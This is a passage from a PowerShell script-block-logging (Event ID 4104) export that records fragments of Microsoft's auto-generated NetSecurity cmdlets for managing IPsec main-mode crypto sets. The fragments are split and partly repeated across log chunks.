                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecMainModeCryptoSet.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Rename-NetIPsecMainModeCryptoSet' -Alias '*'
        

function Copy-NetIPsecMainModeCryptoSet
{
    [CmdletBinding(DefaultParameterSetName='GetAll', SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEMMCryptoSet')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [Alias('ID')]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayName},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Description},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${DisplayGroup},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Group},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [uint32[]]
    ${MaxMinutes},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [uint32[]]
    ${MaxSessions},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [bool[]]
    ${ForceDiffieHellman},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PrimaryStatus[]]
    ${PrimaryStatus},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Status},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${PolicyStoreSource},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PolicyStoreType[]]
    ${PolicyStoreSourceType},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetMainModeRule')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecMainModeRule},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${TracePolicyStore},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetIKEMMCryptoSet')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${NewPolicyStore},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${NewGPOSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${NewName},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('InstanceID', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayName') -and (@('ByDisplayName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayName})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Description') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Description})
        $__cmdletization_queryBuilder.FilterByProperty('Description', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayGroup') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayGroup})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Group') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Group})
        $__cmdletization_queryBuilder.FilterByProperty('RuleGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('MaxMinutes') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${MaxMinutes})
        $__cmdletization_queryBuilder.FilterByProperty('MaxLifetimeMinutes', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('MaxSessions') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {

ScriptBlock ID: f25ca2f5-ae99-46ae-ade0-bcd1dbfae1dc
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (4 of 6):
eenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('InstanceID', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayName') -and (@('ByDisplayName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayName})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Description') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Description})
        $__cmdletization_queryBuilder.FilterByProperty('Description', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayGroup') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayGroup})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Group') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Group})
        $__cmdletization_queryBuilder.FilterByProperty('RuleGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('MaxMinutes') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${MaxMinutes})
        $__cmdletization_queryBuilder.FilterByProperty('MaxLifetimeMinutes', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('MaxSessions') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${MaxSessions})
        $__cmdletization_queryBuilder.FilterByProperty('MaxLifetimeSessions', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('ForceDiffieHellman') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${ForceDiffieHellman})
        $__cmdletization_queryBuilder.FilterByProperty('ForceDiffieHellman', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PrimaryStatus') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PrimaryStatus})
        $__cmdletization_queryBuilder.FilterByProperty('PrimaryStatus', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Status') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Status})
        $__cmdletization_queryBuilder.FilterByProperty('Status', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSource') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSource})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSource', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSourceType') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSourceType})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSourceType', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecMainModeRule') -and (@('ByAssociatedNetIPsecMainModeRule') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecMainModeRule}, 'MSFT_NetMainModeRuleMMCryptoSet', 'GroupComponent', 'PartComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecMainModeRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecMainModeRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }
    if ($PSBoundParameters.ContainsKey('TracePolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecMainModeRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('TracePolicyStore', ${TracePolicyStore})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecMainModeRule', 'GetAll', 'InputObject (cdxml)') -contains $_ } {
      $__cmdletization_returnValue = $null
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:DeleteInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecMainModeCryptoSet.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Remove-NetIPsecMainModeCryptoSet' -Alias '*'
        

function Rename-NetIPsecMainModeCryptoSet
{
    [CmdletBinding(DefaultParameterSetName='GetAll', SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEMMCryptoSet')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [Alias('ID')]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayName},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Description},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${DisplayGroup},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Group},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [uint32[]]
    ${MaxMinutes},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [uint32[]]
    ${MaxSessions},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [bool[]]
    ${ForceDiffieHellman},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PrimaryStatus[]]
    ${PrimaryStatus},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Status},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${PolicyStoreSource},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PolicyStoreType[]]
    ${PolicyStoreSourceType},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetMainModeRule')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecMainModeRule},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${TracePolicyStore},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetIKEMMCryptoSet')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='ByName', Mandatory=$true)]
    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [Parameter(ParameterSetName='ByQuery', Mandatory=$true)]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule', Mandatory=$true)]
    [Parameter(ParameterSetName='GetAll', Mandatory=$true)]
    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true)]
    [string]
    ${NewName},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('InstanceID', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayName') -and (@('ByDisplayName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayName})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Description') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Description})
        $__cmdletization_queryBuilder.FilterByProperty('Description', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayGroup') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayGroup})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Group') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Group})
        $__cmdletization_queryBuilder.FilterByProperty('RuleGroup', $

ScriptBlock ID: f25ca2f5-ae99-46ae-ade0-bcd1dbfae1dc
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (3 of 6):
PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('InstanceID', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayName') -and (@('ByDisplayName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayName})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayGroup') -and (@('ByDisplayGroup') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayGroup})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Group') -and (@('ByGroup') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Group})
        $__cmdletization_queryBuilder.FilterByProperty('RuleGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByName', 'ByDisplayName', 'ByDisplayGroup', 'ByGroup') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('ByName', 'ByDisplayName', 'ByDisplayGroup', 'ByGroup') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('ByName', 'ByDisplayName', 'ByDisplayGroup', 'ByGroup', 'InputObject (cdxml)') -contains $_ } {
          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('NewDisplayName')) {
            [object]$__cmdletization_value = ${NewDisplayName}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ElementName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ElementName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Description')) {
            [object]$__cmdletization_value = ${Description}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Proposal')) {
            [object]$__cmdletization_value = ${Proposal}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Proposals'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Proposals'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('MaxMinutes')) {
            [object]$__cmdletization_value = ${MaxMinutes}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MaxLifetimeMinutes'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MaxLifetimeMinutes'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
